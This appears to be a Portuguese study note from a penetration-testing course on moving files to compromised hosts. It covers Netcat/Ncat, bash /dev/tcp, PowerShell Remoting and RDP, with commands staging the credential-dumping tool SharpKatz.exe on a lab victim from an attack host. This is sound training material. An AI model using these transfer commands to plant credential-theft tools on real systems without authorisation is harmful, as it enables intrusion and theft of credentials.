## NetCat
``NetCat`` é um utilitário de rede para a leitura e gravação de conexões de rede usando TCO ou UDP, então podemos usa-lo para a transferência de arquivos.

O Netcat original foi [lançado](http://seclists.org/bugtraq/1995/Oct/0028.html) pela Hobbit em 1995, mas não foi mantido apesar de sua popularidade. A flexibilidade e utilidade desta ferramenta levaram o Projeto Nmap a produzir [o Ncat](https://nmap.org/ncat/) , uma reimplementação moderna que suporta proxies SSL, IPv6, SOCKS e HTTP, corretagem de conexão e muito mais.

## Transferência de arquivos com Netcat e Ncat
O alvo ou máquina atacante pode ser usado para iniciar a conexão, o que é útil se um firewall impede o acesso ao alvo. Vamos criar um exemplo e transferir uma ferramenta para nosso alvo.

Neste exemplo, transferiremos [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) do nosso Pwnbox para a máquina comprometida. Faremos isso usando dois métodos. Vamos trabalhar no primeiro.

Primeiro, iniciaremos o Netcat ( `nc`) na máquina comprometida, escutando com a opção `-l`, selecionando a porta para escutar com a opção `-p 8000`e redirecionando o [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)) usando um único maior que `>`seguido pelo nome do arquivo, `SharpKatz.exe`.

Se a máquina comprometida estiver usando Ncat, precisaremos especificar `--recv-only` para o fechamento da conexão quando a transferência do arquivo for concluída.

#### NetCat - Máquina comprometida - Escutando na porta 8000
```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

Se a máquina comprometida estiver usando Ncat, precisaremos especificar `--recv-only` para o fechamento da conexão quando a transferência do arquivo for concluída.
```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

#### Ncat - Máquina comprometida - Escutando na porta 8000
```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Do nosso host de ataque, conectaremos à máquina comprometida na porta 8000 usando o Netcat e enviaremos o arquivo [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) como entrada para o Netcat. A opção `-q 0` dirá ao Netcat para fechar a conexão quando ela terminar. Dessa forma, saberemos quando a transferência do arquivo foi concluída.

#### Netcat - Host de ataque - Enviando arquivo para máquina comprometida
```shell-session
NycolasES6@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
NycolasES6@htb[/htb]$ # Example using Original Netcat
NycolasES6@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

Ao utilizar Ncat em nosso host de ataque, podemos optar por `--send-only`em vez de `-q`. O sinalizador `--send-only`, quando usado nos modos connect e listen, solicita que o Ncat encerre assim que sua entrada for esgotada.

#### Ncat - Host de ataque - Enviando arquivo para máquina comprometida
```shell-session
NycolasES6@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
NycolasES6@htb[/htb]$ # Example using Ncat
NycolasES6@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Em vez de escutar em nossa máquina comprometida, podemos nos conectar a uma porta em nosso host de ataque para executar a operação de transferência de arquivo. Este método é útil em cenários onde há um firewall bloqueando conexões de entrada.

Vamos escutar na porta 443 em nosso Pwnbox e enviar o arquivo [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) como entrada para o Netcat.

#### Host de Ataque - Enviando Arquivo como Entrada para Netcat
```shell-session
NycolasES6@htb[/htb]$ # Example using Original Netcat
NycolasES6@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Máquina comprometida conecta-se ao Netcat para receber o arquivo
```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Vamos fazer o mesmo com o Ncat:

#### Host de Ataque - Enviando Arquivo como Entrada para Ncat
```shell-session
NycolasES6@htb[/htb]$ # Example using Ncat
NycolasES6@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Máquina comprometida conecta-se ao Ncat para receber o arquivo
```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

Se não tivermos Netcat ou Ncat em nossa máquina comprometida, o Bash suporta operações de leitura/gravação em um arquivo de pseudodispositivo [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html) .

Escrever neste arquivo específico faz com que o Bash abra uma conexão TCP com `host:port`, e esse recurso pode ser usado para transferências de arquivos.

#### NetCat - Enviando arquivo como entrada para Netcat
```shell-session
NycolasES6@htb[/htb]$ # Example using Original Netcat
NycolasES6@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Enviando arquivo como entrada para Netcat
```shell-session
NycolasES6@htb[/htb]$ # Example using Ncat
NycolasES6@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Máquina comprometida conectando-se ao Netcat usando /dev/tcp para receber o arquivo
```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## Transferência de arquivo de sessão do PowerShell

Pode haver cenários em que HTTP, HTTPS ou SMB não estejam disponíveis. Se esse for o caso, podemos usar [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) , também conhecido como WinRM, para executar operações de transferência de arquivos.

[O PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) nos permite executar scripts ou comandos em um computador remoto usando sessões do PowerShell. Por padrão, habilitar o PowerShell Remoting cria um ouvinte HTTP e um HTTPS. Os ouvintes são executados nas portas padrão TCP/5985 para HTTP e TCP/5986 para HTTPS.

Para criar uma sessão do PowerShell Remoting em um computador remoto, precisaremos de acesso administrativo, ser um membro do grupo `Remote Management Users` ou ter permissões explícitas para o PowerShell Remoting na configuração da sessão.

Vamos criar um exemplo e transferir um arquivo de `DC01` para `DATABASE01`e vice-versa. Temos uma sessão como `Administrator`em `DC01`, o usuário tem direitos administrativos em `DATABASE01`, e o PowerShell Remoting está habilitado. Vamos usar Test-NetConnection para confirmar que podemos conectar ao WinRM.

#### Em DC01 - Confirme se a porta TCP 5985 do WinRM está aberta em DATABASE01.
```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Como essa sessão já tem privilégios sobre `DATABASE01`, não precisamos especificar credenciais. No exemplo abaixo, uma sessão é criada para o computador remoto chamado `DATABASE01`e armazena os resultados na variável chamada `$Session`.

#### Crie uma sessão remota do PowerShell para DATABASE01
```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

Podemos usar o cmdlet `Copy-Item` para copiar um arquivo da nossa máquina local `DC01` para a sessão `DATABASE01` que temos `$Session` ou vice-versa.

#### Copie samplefile.txt do nosso Localhost para a sessão DATABASE01
```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copie DATABASE.txt da sessão DATABASE01 para nosso Localhost
```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP
RDP (Remote Desktop Protocol) é comumente usado em redes Windows para acesso remoto. Podemos transferir arquivos usando RDP copiando e colando. Podemos clicar com o botão direito e copiar um arquivo da máquina Windows à qual nos conectamos e colá-lo na sessão RDP.

Se estivermos conectados do Linux, podemos usar `xfreerdp` ou `rdesktop`. No momento da escrita, `xfreerdp` e `rdesktop` permitem a cópia da nossa máquina de destino para a sessão RDP, mas pode haver cenários em que isso pode não funcionar como esperado.

Como alternativa a copiar e colar, podemos montar um recurso local no servidor RDP de destino `rdesktop` ou `xfreerdp`pode ser usado para expor uma pasta local na sessão RDP remota.

#### Montando uma pasta Linux usando rdesktop
```shell-session
NycolasES6@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Montando uma pasta Linux usando xfreerdp
```shell-session
NycolasES6@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

Para acessar o diretório, podemos nos conectar ao `\\tsclient\`, o que nos permite transferir arquivos de e para a sessão RDP.

![[Pasted image 20240826090408.png]]

Como alternativa, no Windows, o cliente de área de trabalho remota nativo [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) pode ser usado.

![[Pasted image 20240826090422.png]]

Após selecionar a unidade, podemos interagir com ela na sessão remota que se segue.

## A prática leva à perfeição

Vale a pena referenciar esta seção ou criar suas próprias notas sobre essas técnicas e aplicá-las a laboratórios em outros módulos no Caminho de Função de Trabalho de Testador de Penetração e além. Alguns módulos/seções onde elas podem ser úteis incluem:

- `Active Directory Enumeration and Attacks`- Avaliações de habilidades 1 e 2
- Ao longo do `Pivoting, Tunnelling & Port Forwarding`módulo
- Ao longo do `Attacking Enterprise Networks`módulo
- Ao longo do `Shells & Payloads`módulo


















































